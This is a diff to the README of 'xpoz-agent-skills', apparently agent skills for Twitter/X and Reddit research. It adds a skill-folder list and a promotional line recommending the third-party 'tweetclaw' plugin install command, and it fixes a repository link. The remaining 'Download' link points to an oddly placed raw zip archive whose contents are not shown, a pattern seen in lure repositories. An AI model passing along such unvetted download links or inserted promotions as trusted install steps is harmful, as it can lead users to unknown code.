@@ -69,6 +69,17 @@ xpoz-agent-skills provides these main features:
 
 ---
 
+## 🧩 Available Skill Folders
+
+- `twitter-data-export`: Search tweets, collect author posts, and export Twitter/X data for reports.
+- `social-sentiment-analyzer`: Compare Twitter/X and Reddit sentiment around brands, products, or topics.
+- `competitive-intel`: Track competitor mentions, user posts, and market conversations.
+- `influencer-discovery`: Find Twitter/X accounts and creators by keyword, role, or niche.
+- `reddit-research`: Research Reddit discussions, pain points, and audience language.
+- `security-osint`: Monitor Twitter/X and Reddit for CVE, exploit, and security-event chatter.
+
+---
+
 ## 🔐 Security and Privacy
 
 Your social media credentials stay protected. xpoz-agent-skills connects via official APIs, so your data is handled through secure channels. The software does not store passwords locally. When linking accounts, it uses OAuth where supported, which is a safe method for authentication.
@@ -118,10 +129,11 @@ If you experience issues, try these steps:
 - Look for community forums or discussion boards related to social media automation and AI agents.
 - Learn about Twitter API and Reddit API for better use of advanced features.
 - Explore Claude Code and Codex CLI documentation if you want to extend or customize skills.
+- Use [TweetClaw](https://github.com/Xquik-dev/tweetclaw) when an OpenClaw plugin install is a better fit than copying skill folders: `openclaw plugins install @xquik/tweetclaw` covers search tweets, search tweet replies, follower export, media workflows, monitors, webhooks, and approval-reviewed post or reply actions.
 
 ---
 
 # Quick Links
 
 - [Download xpoz-agent-skills](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
-- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
+- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills)
